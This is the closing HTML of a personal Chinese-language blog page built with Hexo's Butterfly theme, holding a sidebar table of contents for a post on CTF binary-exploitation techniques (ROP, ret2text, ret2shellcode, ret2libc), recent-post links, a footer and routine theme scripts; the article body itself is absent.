class="length-num">111</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">34</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Randolfluo" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:lrj3216610@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP"><span class="toc-number">1.</span> <span class="toc-text">ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.1.</span> <span class="toc-text">checksec</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Arch"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">Arch</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RELRO"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">RELRO</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Stack"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Stack</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NX"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">NX</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PIE"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">PIE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">1.2.</span> <span class="toc-text">ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">1.2.1.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">1.2.2.</span> <span class="toc-text">jarvisoj_level2_x64</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.3.</span> <span class="toc-text">ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E4%BD%8D%E4%B8%8E64%E4%BD%8D%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84shellcraft-%E7%94%9F%E6%88%90%E7%9A%84shellcode"><span class="toc-number">1.3.1.</span> <span class="toc-text">32位与64位操作系统的shellcraft()生成的shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E7%B2%BE%E7%AE%80%E7%89%88"><span class="toc-number">1.3.2.</span> <span class="toc-text">shellcode精简版</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mrctf2020-shellcode1"><span class="toc-number">1.3.3.</span> <span class="toc-text">mrctf2020_shellcode1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ciscn-2019-s-9"><span class="toc-number">1.3.4.</span> <span class="toc-text">ciscn_2019_s_9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwnable-orw"><span class="toc-number">1.3.5.</span> <span class="toc-text">pwnable_orw</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mrctf2020-shellcode-revenge"><span class="toc-number">1.3.6.</span> <span class="toc-text">mrctf2020_shellcode_revenge</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jarvisoj%E2%80%94%E2%80%94level1"><span class="toc-number">1.3.7.</span> <span class="toc-text">jarvisoj——level1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.4.</span> <span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%BE%E5%87%BA%E4%BF%AE%E6%94%B9%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">找出修改的寄存器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.5.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E9%93%BE%E6%8E%A5%E8%A1%A8%EF%BC%88PLT%EF%BC%89%E5%92%8C%E5%85%A8%E5%B1%80%E5%81%8F%E7%A7%BB%E9%87%8F%E8%A1%A8%EF%BC%88GOT%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">过程链接表（PLT）和全局偏移量表（GOT）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x1"><span class="toc-number">1.5.2.</span> <span class="toc-text">0x1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2"><span class="toc-number">1.6.</span> <span class="toc-text">0x2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3"><span class="toc-number">1.6.1.</span> <span class="toc-text">0x3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/11/dailyrecord/2024_11_11/" title="记一次2024ICPC杭州站"><img src="/img/cover1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次2024ICPC杭州站"/></a><div class="content"><a class="title" href="/2024/11/11/dailyrecord/2024_11_11/" title="记一次2024ICPC杭州站">记一次2024ICPC杭州站</a><time datetime="2024-11-10T16:00:00.000Z" title="发表于 2024-11-11 00:00:00">2024-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/15/math/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/" title="无标题"><img src="/img/cover3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2024/10/15/math/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/" title="无标题">无标题</a><time datetime="2024-10-15T06:44:44.734Z" title="发表于 2024-10-15 14:44:44">2024-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/29/potato_clock/v0.01/" title="无标题"><img src="/img/cover2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2024/09/29/potato_clock/v0.01/" title="无标题">无标题</a><time datetime="2024-09-29T06:08:49.443Z" title="发表于 2024-09-29 14:08:49">2024-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/26/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%840x2/" title="无标题"><img src="/img/cover1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2024/09/26/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%840x2/" title="无标题">无标题</a><time datetime="2024-09-26T12:40:48.042Z" title="发表于 2024-09-26 20:40:48">2024-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/26/pr/pr%E5%85%A5%E9%97%A8/" title="无标题"><img src="/img/cover1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/></a><div class="content"><a class="title" href="/2024/09/26/pr/pr%E5%85%A5%E9%97%A8/" title="无标题">无标题</a><time datetime="2024-09-26T12:40:47.924Z" title="发表于 2024-09-26 20:40:47">2024-09-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover2.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Randolf luo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }
      
      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (true) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>